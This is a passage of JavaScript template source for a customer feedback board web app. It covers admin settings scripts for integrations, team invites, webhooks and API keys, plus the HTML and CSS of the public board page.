          statusLabels: statusLabels,
          linearStateIds: linearStateIds,
          categories: categories,
          hiddenRoadmapStatuses: hiddenRoadmapStatuses,
          autoPromoteVoteThreshold: formData.get('autoPromoteVoteThreshold') || '',
        };

        btn.disabled = true;
        btn.textContent = 'Saving...';
        note.textContent = '';
        note.style.color = '';

        fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/settings', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify(body),
        })
          .then(function (r) { return r.json().catch(function () { return {}; }); })
          .then(function (d) {
            btn.disabled = false;
            btn.textContent = 'Save settings';
            if (d && d.ok) {
              note.textContent = 'Settings saved.';
              note.style.color = 'var(--good)';
            } else {
              note.textContent = (d && d.error) || 'Could not save - try again.';
              note.style.color = 'var(--bad)';
            }
          })
          .catch(function () {
            // A network/transport failure (e.g. a dropped QUIC connection) lands
            // here - keep the form and everything the customer typed intact and
            // let them just retry, instead of a full-page browser error wiping it.
            btn.disabled = false;
            btn.textContent = 'Save settings';
            note.textContent = 'Network error - your changes were not lost, click Save settings to retry.';
            note.style.color = 'var(--bad)';
          });
      }

      form.addEventListener('submit', function (e) {
        e.preventDefault();
        submitSettings();
      });
    })();

    document.getElementById('copyEmbedBtn').addEventListener('click', function () {
      var btn = this;
      var text = document.getElementById('embedSnippet').textContent;
      navigator.clipboard.writeText(text).then(function () {
        btn.textContent = 'Copied!';
        btn.classList.add('copied');
        setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
      });
    });

    document.getElementById('copyChangelogEmbedBtn').addEventListener('click', function () {
      var btn = this;
      var text = document.getElementById('changelogEmbedSnippet').textContent;
      navigator.clipboard.writeText(text).then(function () {
        btn.textContent = 'Copied!';
        btn.classList.add('copied');
        setTimeout(function () { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 1500);
      });
    });

    function loadPicker(kind, pickerId, noteId, inputId, currentValue) {
      var picker = document.getElementById(pickerId);
      var note = document.getElementById(noteId);
      var input = document.getElementById(inputId);

      fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/destinations?kind=' + kind)
        .then(function (r) { return r.json(); })
        .then(function (d) {
          var options = (d && d.ok && d.options) || [];
          if (!options.length) {
            picker.innerHTML = '<option>No options found</option>';
            picker.disabled = true;
            note.textContent = d && d.ok
              ? 'Nothing found yet - type the value manually below.'
              : 'Connect this tool first on the Connect your tools page, or type the value manually below.';
            return;
          }
          var html = '<option value="">Choose...</option>';
          options.forEach(function (o) {
            var selected = o.id === currentValue ? ' selected' : '';
            html += '<option value="' + o.id.replace(/"/g, '&quot;') + '"' + selected + '>' + o.label.replace(/</g, '&lt;') + '</option>';
          });
          picker.innerHTML = html;
          picker.disabled = false;
          note.textContent = 'Selecting an option below fills in the field for you.';
          picker.addEventListener('change', function () {
            if (picker.value) input.value = picker.value;
          });
        })
        .catch(function () {
          picker.innerHTML = '<option>Could not load options</option>';
          picker.disabled = true;
          note.textContent = 'Type the value manually below.';
        });
    }

    loadPicker('slack', 'slackChannelPicker', 'slackChannelNote', 'slackChannel', ${JSON.stringify(settings.slackChannel || "")});
    loadPicker('linear', 'linearTeamPicker', 'linearTeamNote', 'linearTeamId', ${JSON.stringify(settings.linearTeamId || "")});
    loadPicker('notion', 'notionPagePicker', 'notionPageNote', 'notionPageId', ${JSON.stringify(settings.notionPageId || "")});

    function loadStatePicker(statusKey) {
      var select = document.getElementById('linearState_' + statusKey);
      if (!select) return;
      var note = document.getElementById('linearStateNote_' + statusKey);
      var currentValue = select.getAttribute('data-current') || '';
      var teamId = document.getElementById('linearTeamId').value.trim();
      if (!teamId) {
        select.innerHTML = '<option value="">Connect a Linear team above first</option>';
        select.disabled = true;
        return;
      }
      fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/destinations?kind=linear-states&teamId=' + encodeURIComponent(teamId))
        .then(function (r) { return r.json(); })
        .then(function (d) {
          var options = (d && d.ok && d.options) || [];
          if (!options.length) {
            select.innerHTML = '<option value="">No states found</option>';
            select.disabled = true;
            return;
          }
          var html = '<option value="">Not mapped - this status does not sync with Linear</option>';
          options.forEach(function (o) {
            var selected = o.id === currentValue ? ' selected' : '';
            html += '<option value="' + o.id.replace(/"/g, '&quot;') + '"' + selected + '>' + o.label.replace(/</g, '&lt;') + '</option>';
          });
          select.innerHTML = html;
          select.disabled = false;
          if (note) note.textContent = 'Only this exact state syncs with "' + statusKey.replace('_', ' ') + '" - other states on this team stay internal.';
        })
        .catch(function () {
          select.innerHTML = '<option value="">Could not load Linear states</option>';
          select.disabled = true;
        });
    }
    loadStatePicker('planned');
    loadStatePicker('in_progress');
    loadStatePicker('shipped');

    function loadTeam() {
      fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/users')
        .then(function (r) { return r.json(); })
        .then(function (d) {
          var users = (d && d.ok && d.users) || [];
          var list = document.getElementById('teamList');
          if (!users.length) {
            list.innerHTML = '<p class="team-empty">No teammates invited yet - everyone uses the shared admin password above.</p>';
            return;
          }
          list.innerHTML = users.map(function (u) {
            var email = u.email.replace(/</g, '&lt;');
            return '<div class="team-row"><span>' + email + '</span>' +
              '<button type="button" class="btn-remove" data-email="' + email + '">Remove</button></div>';
          }).join('');
          list.querySelectorAll('.btn-remove').forEach(function (btn) {
            btn.addEventListener('click', function () {
              fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/users/remove', {
                method: 'POST',
                headers: { 'content-type': 'application/json' },
                body: JSON.stringify({ email: btn.getAttribute('data-email') }),
              }).then(loadTeam);
            });
          });
        });
    }
    loadTeam();

    document.getElementById('inviteBtn').addEventListener('click', function () {
      var input = document.getElementById('inviteEmail');
      var note = document.getElementById('inviteNote');
      var email = input.value.trim();
      if (!email) return;
      fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/users', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ email: email }),
      })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d.ok) {
            input.value = '';
            note.textContent = 'Invited - they can now sign in with "' + email + '" from the login page.';
            note.style.color = 'var(--good)';
            loadTeam();
          } else {
            note.textContent = d.error || 'Could not add that teammate.';
            note.style.color = 'var(--bad)';
          }
        });
    });

    function loadWebhooks() {
      fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/webhooks')
        .then(function (r) { return r.json(); })
        .then(function (d) {
          var webhooks = (d && d.ok && d.webhooks) || [];
          var list = document.getElementById('webhookList');
          if (!webhooks.length) {
            list.innerHTML = '<p class="team-empty">No webhooks configured yet.</p>';
            return;
          }
          list.innerHTML = webhooks.map(function (w) {
            var url = w.url.replace(/</g, '&lt;');
            var status = w.last_delivery_status
              ? ' - last delivery: ' + w.last_delivery_status
              : ' - no deliveries yet';
            return '<div class="team-row" style="flex-direction:column;align-items:stretch;">' +
              '<div style="display:flex;justify-content:space-between;align-items:center;">' +
              '<span>' + url + '<br/><span style="color:var(--text-faint);font-size:11px;">' + w.events.replace(/,/g, ', ') + status + '</span></span>' +
              '<span>' +
              '<button type="button" class="btn-copy btn-view-deliveries" data-id="' + w.id + '" style="margin-right:6px;">View deliveries</button>' +
              '<button type="button" class="btn-remove" data-id="' + w.id + '">Remove</button>' +
              '</span>' +
              '</div>' +
              '<div id="deliveries-' + w.id + '" style="display:none;margin-top:8px;"></div>' +
              '</div>';
          }).join('');
          list.querySelectorAll('.btn-remove').forEach(function (btn) {
            btn.addEventListener('click', function () {
              fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/webhooks/' + btn.getAttribute('data-id'), {
                method: 'DELETE',
              }).then(loadWebhooks);
            });
          });
          function loadDeliveries(webhookId) {
            var panel = document.getElementById('deliveries-' + webhookId);
            panel.innerHTML = '<p class="hint">Loading...</p>';
            fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/webhooks/' + webhookId + '/deliveries')
              .then(function (r) { return r.json(); })
              .then(function (d) {
                var deliveries = (d && d.ok && d.deliveries) || [];
                if (!deliveries.length) {
                  panel.innerHTML = '<p class="hint">No deliveries logged yet.</p>';
                  return;
                }
                panel.innerHTML = '<div style="border:1px solid var(--border);border-radius:9px;overflow:hidden;">' +
                  deliveries.map(function (del) {
                    var ok = /^delivered/.test(del.status);
                    var when = new Date(del.created_at).toLocaleString();
                    return '<div style="display:flex;justify-content:space-between;align-items:center;padding:7px 10px;border-bottom:1px solid var(--border);font-size:12px;">' +
                      '<span><span style="color:' + (ok ? 'var(--good)' : 'var(--bad)') + ';font-weight:600;">' + del.status + '</span>' +
                      ' <span style="color:var(--text-faint);">' + (del.event_type || '') + ' - ' + when + '</span></span>' +
                      '<button type="button" class="btn-copy btn-redeliver" data-delivery-id="' + del.id + '" style="padding:3px 9px;font-size:11px;">Redeliver</button>' +
                      '</div>';
                  }).join('') + '</div>';
                panel.querySelectorAll('.btn-redeliver').forEach(function (rbtn) {
                  rbtn.addEventListener('click', function () {
                    rbtn.disabled = true;
                    rbtn.textContent = 'Sending...';
                    fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/webhook-deliveries/' + rbtn.getAttribute('data-delivery-id') + '/redeliver', {
                      method: 'POST',
                    })
                      .then(function (r) { return r.json(); })
                      .then(function () { loadDeliveries(webhookId); });
                  });
                });
              });
          }

          list.querySelectorAll('.btn-view-deliveries').forEach(function (btn) {
            btn.addEventListener('click', function () {
              var webhookId = btn.getAttribute('data-id');
              var panel = document.getElementById('deliveries-' + webhookId);
              var isOpen = panel.style.display !== 'none';
              if (isOpen) { panel.style.display = 'none'; return; }
              panel.style.display = 'block';
              loadDeliveries(webhookId);
            });
          });
        });
    }
    loadWebhooks();

    function loadApiKeyStatus() {
      var container = document.getElementById('apiKeyStatus');
      fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/api-key')
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (!d.ok) {
            container.innerHTML = '<p class="hint">Could not load API key status.</p>';
            return;
          }
          if (!d.hasKey) {
            container.innerHTML = '<button type="button" class="btn-copy" id="generateApiKeyBtn">Generate API key</button>';
          } else {
            var created = d.createdAt ? new Date(d.createdAt).toLocaleDateString() : 'unknown date';
            container.innerHTML = '<div class="team-row"><span>' + d.keyPrefix + '<br/><span style="color:var(--text-faint);font-size:11px;">Created ' + created + '</span></span>' +
              '<span><button type="button" class="btn-copy" id="generateApiKeyBtn" style="margin-right:6px;">Regenerate</button>' +
              '<button type="button" class="btn-remove" id="revokeApiKeyBtn">Revoke</button></span></div>';
          }
          wireApiKeyButtons();
        });
    }

    function wireApiKeyButtons() {
      var genBtn = document.getElementById('generateApiKeyBtn');
      var revokeBtn = document.getElementById('revokeApiKeyBtn');
      if (genBtn) {
        genBtn.addEventListener('click', function () {
          var confirmMsg = revokeBtn ? 'This revokes the existing key immediately - anything using it will stop working. Continue?' : null;
          if (confirmMsg && !window.confirm(confirmMsg)) return;
          fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/api-key', { method: 'POST' })
            .then(function (r) { return r.json(); })
            .then(function (d) {
              if (!d.ok) { alert(d.error || 'Could not generate a key.'); return; }
              document.getElementById('apiKeyStatus').innerHTML =
                '<p class="hint" style="color:var(--good);"><strong>Your API key (shown once, copy it now):</strong></p>' +
                '<div class="embed-code"><code>' + d.apiKey + '</code><button type="button" class="btn-copy" id="copyApiKeyBtn">Copy</button></div>';
              document.getElementById('copyApiKeyBtn').addEventListener('click', function () {
                var btn = this;
                navigator.clipboard.writeText(d.apiKey).then(function () {
                  btn.textContent = 'Copied!';
                  setTimeout(function () { loadApiKeyStatus(); }, 1500);
                });
              });
            });
        });
      }
      if (revokeBtn) {
        revokeBtn.addEventListener('click', function () {
          if (!window.confirm('Revoke this API key? Anything using it will stop working immediately.')) return;
          fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/api-key', { method: 'DELETE' })
            .then(function () { loadApiKeyStatus(); });
        });
      }
    }
    loadApiKeyStatus();

    document.getElementById('addWebhookBtn').addEventListener('click', function () {
      var input = document.getElementById('webhookUrl');
      var note = document.getElementById('webhookNote');
      var url = input.value.trim();
      if (!url) return;
      var events = [];
      if (document.getElementById('webhookEventCreated').checked) events.push('idea.created');
      if (document.getElementById('webhookEventStatus').checked) events.push('idea.status_changed');
      if (document.getElementById('webhookEventComment').checked) events.push('comment.created');
      if (document.getElementById('webhookEventMerged').checked) events.push('idea.merged');
      fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/webhooks', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ url: url, events: events }),
      })
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d.ok) {
            input.value = '';
            note.innerHTML = 'Added. <strong>Signing secret (shown once, copy it now):</strong><br/><code style="font-size:11px;word-break:break-all;">' + d.webhook.secret + '</code>';
            note.style.color = 'var(--good)';
            loadWebhooks();
          } else {
            note.textContent = d.error || 'Could not add that webhook.';
            note.style.color = 'var(--bad)';
          }
        });
    });

    var linearSyncToggleBtn = document.getElementById('linearSyncToggleBtn');
    if (linearSyncToggleBtn) {
      linearSyncToggleBtn.addEventListener('click', function () {
        var enabled = ${settings.linearWebhookEnabled ? "true" : "false"};
        var action = enabled ? 'disable' : 'enable';
        linearSyncToggleBtn.disabled = true;
        linearSyncToggleBtn.textContent = enabled ? 'Turning off...' : 'Turning on...';
        fetch('/api/customers/' + encodeURIComponent(customerSlug) + '/linear-sync', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ action: action }),
        })
          .then(function (r) { return r.json(); })
          .then(function (d) {
            if (d.ok) {
              window.location.reload();
            } else {
              linearSyncToggleBtn.disabled = false;
              linearSyncToggleBtn.textContent = enabled ? 'Turn off' : 'Turn on';
              alert(d.error || 'Could not change sync status.');
            }
          });
      });
    }
  </script>
</body>
</html>`;
}

function connectUnavailablePage(customerSlug, isOwner) {
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Connect your tools - RequestHub</title>
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    body { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
    .card { max-width: 420px; text-align: center; padding: 32px; }
    h1 { font-size: 18px; margin: 0 0 8px; color: var(--text); }
    p { color: var(--text-muted); font-size: 13.5px; margin: 0 0 16px; }
    a { color: var(--accent); font-size: 13px; text-decoration: none; }
  </style>
</head>
<body>
  <div class="card">
    <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode" style="position:fixed;top:16px;right:16px;"></button>
    <h1>No connected workspace yet</h1>
    <p>"${escapeHtml(customerSlug)}" isn't set up as a tenant with connectable tools yet.</p>
    <a href="/b/${encodeURIComponent(customerSlug)}">&larr; Back to board</a>
    ${isOwner ? `<br/><a href="/owner">&larr; Owner console</a>` : ""}
  </div>
</body>
</html>`;
}

function boardPage(customerSlug, isOwner) {
  const favicon =
    "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%23625afa'/%3E%3Cpath d='M9 22V10h7.2c2.9 0 4.8 1.7 4.8 4.3 0 1.9-1 3.3-2.7 3.9L22 22h-3.3l-3.2-3.4H12V22H9zm3-5.8h4c1.4 0 2.2-.7 2.2-1.9 0-1.2-.8-1.8-2.2-1.8h-4v3.7z' fill='white'/%3E%3C/svg%3E";
  return `<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>${escapeHtml(customerSlug)} - RequestHub</title>
  <meta name="description" content="Share feedback, vote on ideas, and see what's planned for ${escapeHtml(customerSlug)}." />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="${escapeHtml(customerSlug)} - RequestHub" />
  <meta property="og:description" content="Share feedback, vote on ideas, and see what's planned for ${escapeHtml(customerSlug)}." />
  <meta name="twitter:card" content="summary" />
  <link rel="icon" href="${favicon}" />
  ${DESIGN_FONT_LINK}
  <script>${THEME_TOGGLE_SCRIPT}</script>
  <style>
    ${DESIGN_TOKENS}
    .topbar {
      background: var(--card); border-bottom: 1px solid var(--border);
      padding: 0 24px; display: flex; align-items: center; gap: 4px; height: 56px;
    }
    @media (max-width: 600px) {
      .topbar { flex-wrap: wrap; height: auto; padding: 10px 16px; }
    }
    .logo-mark {
      width: 26px; height: 26px; border-radius: 7px; background: var(--accent); color: #fff;
      display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 13px; flex-shrink: 0;
    }
    .brand { font-weight: 700; font-size: 14px; margin-right: 14px; }
    .top-tab {
      color: var(--text-muted); text-decoration: none; font-size: 13.5px; font-weight: 600; padding: 8px 12px;
      border-radius: 8px;
    }
    .top-tab:hover { color: var(--text); background: var(--surface-2); }
    .top-tab.active { color: var(--accent); background: var(--accent-tint); }
    .nav-right { margin-left: auto; display: flex; align-items: center; gap: 8px; }
    .nav-search {
      background: var(--surface-2); border: 1px solid var(--border); color: var(--text); border-radius: 8px;
      padding: 7px 12px; font-size: 13px; font-family: inherit; width: 200px;
    }
    .nav-search::placeholder { color: var(--text-faint); }
    .nav-admin-link { color: var(--text-muted); text-decoration: none; font-size: 13px; font-weight: 600; }
    .nav-admin-link:hover { color: var(--text); }
    .nav-admin-link.owner-link { color: var(--accent); }

    .page { max-width: 980px; margin: 0 auto; padding: 24px 24px 80px; }
    .board-layout { display: grid; grid-template-columns: 1fr 240px; gap: 24px; align-items: start; }
    @media (max-width: 760px) { .board-layout { grid-template-columns: 1fr; } .sidebar { order: 2; } }

    .main { min-width: 0; }

    .composer {
      display: flex; align-items: center; gap: 10px; background: var(--card); border: 1px solid var(--border);
      border-radius: var(--radius-card); padding: 12px 16px; margin-bottom: 14px; cursor: pointer;
    }
    .composer .icon { color: var(--text-faint); flex-shrink: 0; }
    .composer-text { flex: 1; color: var(--text-faint); font-size: 13.5px; }
    .btn-add {
      background: var(--accent); color: #fff; border: none; padding: 9px 16px;
      border-radius: var(--radius-btn); font-size: 13px; font-weight: 600; cursor: pointer; font-family: inherit;
      display: flex; align-items: center; gap: 6px; flex-shrink: 0;
    }
    .btn-add:hover { background: var(--accent-hover); }

    .filters-row { display: flex; gap: 8px; margin-bottom: 14px; flex-wrap: wrap; align-items: center; }
    .filter-tabs { display: flex; gap: 4px; background: var(--surface-2); border-radius: 9px; padding: 3px; }
    .filter-tab { background: none; border: none; cursor: pointer; font-family: inherit; font-size: 12.5px; font-weight: 600; color: var(--text-muted); padding: 7px 12px; border-radius: 7px; }
    .filter-tab.active { background: var(--card); color: var(--text); box-shadow: 0 1px 2px rgba(20,16,60,.06); }
    .filters-row input[type="text"], .filters-row input#search {
      background: var(--card); border: 1px solid var(--border); color: var(--text);
      border-radius: 9px; padding: 8px 12px; font-size: 13px; font-family: inherit; flex: 1; min-width: 140px;
    }
    .filters-row input::placeholder { color: var(--text-faint); }
    .filters-row select {
      background: var(--card); border: 1px solid var(--border); color: var(--text);
      border-radius: 9px; padding: 8px 12px; font-size: 13px; font-family: inherit; cursor: pointer; flex-shrink: 0;
    }

    .empty { color: var(--text-faint); font-size: 13.5px; text-align: center; padding: 40px 16px; }

    .idea { background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card); padding: 14px 16px; margin-bottom: 8px; }
    .idea.pinned { border-color: var(--accent); background: var(--accent-tint); }
    .pin-badge { font-size: 11px; vertical-align: 1px; }
    .comment-match-badge { font-size: 10.5px; font-weight: 600; color: var(--text-faint); background: var(--surface-2); padding: 2px 7px; border-radius: var(--radius-pill); vertical-align: 1px; }
    .idea-row { display: flex; gap: 14px; align-items: flex-start; }
    .idea-body { flex: 1; min-width: 0; }
    .idea-title { font-weight: 600; font-size: 14px; color: var(--text); }
    .idea-desc { color: var(--text-muted); font-size: 13px; margin-top: 3px; line-height: 1.45; }
    .meta { margin-top: 10px; display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }

    .chip {
      display: inline-flex; align-items: center; gap: 4px; padding: 2px 8px; border-radius: var(--radius-pill);
      font-weight: 600; font-size: 11px;
    }

    .status-chip {
      font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: var(--radius-pill); text-transform: capitalize;
    }
    .status-chip.under_review { background-color: var(--surface-3); color: var(--text-muted); }
    .status-chip.planned { background-color: var(--info-tint); color: var(--info); }
    .status-chip.in_progress { background-color: var(--warn-tint); color: var(--warn); }
    .status-chip.shipped { background-color: var(--good-tint); color: var(--good); }
    .status-chip.declined { background-color: var(--bad-tint); color: var(--bad); }

    .meta-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
    .comment-count { display: inline-flex; align-items: center; gap: 4px; color: var(--text-faint); font-size: 12px; font-weight: 500; background: none; border: none; cursor: pointer; font-family: inherit; padding: 0; }
    .comment-count:hover { color: var(--text); }

    .vote-widget {
      flex-shrink: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 0;
      width: 38px; border: 1px solid var(--border); border-radius: 9px; padding: 5px 0;
    }
    .vote-arrow { background: none; border: none; cursor: pointer; color: var(--text-faint); padding: 1px; display: flex; }
    .vote-arrow:hover:not(:disabled) { color: var(--accent); }
    .vote-arrow:disabled { opacity: .25; cursor: default; }
    .vote-arrow.on { color: var(--accent); }
    .vote-count { font-size: 13px; font-weight: 700; color: var(--text); }

    .comments { display: none; margin-top: 12px; border-top: 1px solid var(--border); padding-top: 12px; }
    .comments.open { display: block; }
    .comments-list { margin-bottom: 10px; }
    .comment { font-size: 12.5px; margin-bottom: 10px; display: flex; gap: 8px; }
    .comment-avatar {
      width: 20px; height: 20px; border-radius: 50%; background: var(--accent-tint); color: var(--accent);
      font-size: 10px; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0;
    }
    .comment-body-text { color: var(--text); line-height: 1.4; }
    .comment-author { font-weight: 600; margin-right: 4px; }
    .comment-form { display: flex; flex-wrap: wrap; gap: 6px; }
    .comment-form input {
      background: var(--surface-2); border: 1px solid var(--border); color: var(--text); margin: 0;
      padding: 7px 10px; font-size: 12.5px; border-radius: 7px; font-family: inherit;
    }
    .comment-form input::placeholder { color: var(--text-faint); }
    .comment-form .comment-name { flex: 1 1 100px; }
    .comment-form .comment-email { flex: 1 1 130px; }
    .comment-form .comment-body { flex: 1 1 100%; }
    .comment-form button {
      margin: 0; padding: 7px 14px; font-size: 12.5px; font-weight: 600; border: none;
      border-radius: 7px; background: var(--accent); color: #fff; cursor: pointer; font-family: inherit;
    }
    .comment-form button:hover { background: var(--accent-hover); }

    .form-card {
      background: var(--card); border: 1px solid var(--border); border-radius: var(--radius-card);
      padding: 18px 20px; margin-bottom: 14px; display: none;
    }
    .form-card.open { display: block; }
    .form-card h3 { margin: 0 0 12px; font-size: 14px; color: var(--text); }
    .field { margin-bottom: 12px; }
    .field label { display: block; font-size: 11.5px; font-weight: 600; text-transform: uppercase; letter-spacing: .03em; color: var(--text-faint); margin-bottom: 5px; }
    .field input, .field textarea, .field select {
      width: 100%; background: var(--surface-2); border: 1px solid var(--border); color: var(--text);
      border-radius: 8px; padding: 9px 11px; font-size: 13.5px; font-family: inherit;
    }
    .field textarea { resize: vertical; min-height: 60px; }
    .row-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    @media (max-width: 480px) { .row-2 { grid-template-columns: 1fr; } }
    .btn-submit {
      background: var(--accent); color: #fff; border: none; padding: 10px 18px; border-radius: var(--radius-btn);
      font-size: 13.5px; font-weight: 600; cursor: pointer; font-family: inherit; margin-top: 4px;
    }
    .btn-submit:hover { background: var(--accent-hover); }
    .btn-cancel {
      background: none; color: var(--text-muted); border: none; padding: 10px 14px; font-size: 13.5px;
      cursor: pointer; font-family: inherit;
    }
    .similar-ideas {
      background: var(--surface-2); border: 1px solid var(--border); border-radius: 8px;
      padding: 10px 12px; margin: -2px 0 12px; display: none;
    }
    .similar-ideas.open { display: block; }
    .similar-ideas-label { font-size: 11px; font-weight: 600; color: var(--text-faint); margin-bottom: 6px; }
    .similar-idea-row {
      display: flex; align-items: center; gap: 8px; padding: 6px 0; font-size: 13px;
      border-top: 1px solid var(--border);
    }
    .similar-idea-row:first-of-type { border-top: none; }
    .similar-idea-title { flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--text); }
    .similar-idea-votes { font-size: 11px; color: var(--text-faint); flex-shrink: 0; }
    .similar-idea-upvote {
      background: var(--accent-tint); color: var(--accent); border: none; border-radius: var(--radius-pill);
      font-size: 11.5px; font-weight: 600; padding: 4px 10px; cursor: pointer; font-family: inherit; flex-shrink: 0;
    }
    .similar-idea-upvote:disabled { opacity: .5; cursor: default; }

    .sidebar { display: flex; flex-direction: column; gap: 18px; }
    .sidebar-label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .05em; color: var(--text-faint); padding: 0 10px; margin-bottom: 4px; }
    .nav-list { display: flex; flex-direction: column; gap: 1px; }
    .nav-item {
      display: flex; align-items: center; gap: 9px; width: 100%; background: none; border: none; cursor: pointer;
      color: var(--text-muted); font-family: inherit; font-size: 13.5px; font-weight: 500; padding: 8px 10px;
      border-radius: 8px; text-align: left;
    }
    .nav-item:hover { background: var(--surface-2); color: var(--text); }
    .nav-item.active { background: var(--accent-tint); color: var(--accent); font-weight: 600; }
    .nav-item .count { margin-left: auto; font-size: 11.5px; color: var(--text-faint); }
    .nav-item.active .count { color: var(--accent); }
    .cat-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--text-faint); flex-shrink: 0; }
    .cat-dot.Feature { background: var(--accent); }
    .cat-dot.Bug { background: var(--bad); }
    .cat-dot.Feedback { background: var(--good); }

    .sidebar-link {
      display: flex; align-items: center; gap: 9px; padding: 8px 10px; color: var(--text-muted);
      text-decoration: none; font-size: 13.5px; font-weight: 500; border-radius: 8px;
    }
    .sidebar-link:hover { background: var(--surface-2); color: var(--text); }
    .sidebar-link.cta { color: var(--accent); font-weight: 600; }

    .footer-note { text-align: center; color: var(--text-faint); font-size: 11.5px; margin-top: 32px; }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo-mark">R</div>
    <div class="brand">${escapeHtml(customerSlug)}</div>
    <a class="top-tab active" href="/b/${encodeURIComponent(customerSlug)}">Feedback</a>
    <a class="top-tab" href="/b/${encodeURIComponent(customerSlug)}/roadmap">Roadmap</a>
    <a class="top-tab" href="/b/${encodeURIComponent(customerSlug)}/changelog">Changelog</a>
    <div class="nav-right">
      <button type="button" class="theme-toggle" id="themeToggle" title="Toggle dark mode"></button>
      ${isOwner ? `<a class="nav-admin-link owner-link" href="/owner">&larr; Owner console</a>` : ""}
      <a class="nav-admin-link" href="/b/${encodeURIComponent(customerSlug)}/admin">Admin</a>
    </div>
  </div>

  <div class="page">
    <div class="board-layout">
      <div class="main">
        <div class="composer" id="openFormBtn">
          <svg class="icon" viewBox="0 0 24 24"><path d="M12 20h9"/><path d="M16.5 3.5a2.1 2.1 0 0 1 3 3L7 19l-4 1 1-4Z"/></svg>
          <span class="composer-text">Share an idea or report a problem...</span>
          <button type="button" class="btn-add"><svg class="icon" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>Feedback</button>
        </div>

        <div class="form-card" id="formCard">
          <h3>Share your feedback</h3>
          <form id="submit-form">
            <div class="field">
              <label for="title">What's your idea, bug, or feedback?</label>
              <input id="title" required maxlength="200" placeholder="e.g. Export data as CSV" autocomplete="off" />
            </div>
            <div class="similar-ideas" id="similarIdeas"></div>
            <div class="field">
              <label for="description">More detail (optional)</label>
              <textarea id="description" maxlength="2000" placeholder="Add any extra context..."></textarea>
            </div>
            <div class="row-2">
              <div class="field">
                <label for="category">Category</label>
                <select id="category">
                  <option>Feature</option>
                  <option>Bug</option>
                  <option>Feedback</option>
                </select>
              </div>
              <div class="field">
                <label for="submitterEmail">Your email (optional)</label>
                <input id="submitterEmail" type="email" placeholder="you@example.com" />
              </div>
            </div>
            <div class="field">
              <label for="tags">Tags (optional, comma separated, up to 5)</label>
              <input id="tags" maxlength="200" placeholder="e.g. mobile, performance" />
            </div>
            <button type="submit" class="btn-submit" id="submitFormBtn">Submit</button>
            <button type="button" class="btn-cancel" id="cancelFormBtn">Cancel</button>
          </form>
        </div>

        <div class="filters-row">
          <div class="filter-tabs">
            <button class="filter-tab active" data-sort="trending">Trending</button>
            <button class="filter-tab" data-sort="votes">Most voted</button>
            <button class="filter-tab" data-sort="new">Newest</button>
            <button class="filter-tab" data-sort="comments">Most commented</button>
          </div>
          <select id="statusFilter"><option value="all">All statuses</option></select>
          <input id="search" placeholder="Search feedback... (press /)" title="Press / to search, c to compose" aria-label="Search feedback" />
        </div>

        <div id="list"><div class="empty">Loading...</div></div>
      </div>

      <div class="sidebar">
        <div>
          <div class="sidebar-label">Categories</div>
          <div class="nav-list" id="categoryNav"></div>
        </div>
        <div>
          <div class="sidebar-label">Tools</div>
          <div class="nav-list">
            <a class="sidebar-link" href="/b/${encodeURIComponent(customerSlug)}/roadmap">
              <svg class="icon" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2"/><line x1="9" y1="4" x2="9" y2="20"/><line x1="15" y1="4" x2="15" y2="20"/></svg>
              Roadmap
            </a>
            <a class="sidebar-link" href="/b/${encodeURIComponent(customerSlug)}/admin">
              <svg class="icon" viewBox="0 0 24 24"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg>
              Triage dashboard
            </a>
            <a class="sidebar-link" href="/b/${encodeURIComponent(customerSlug)}/connect">
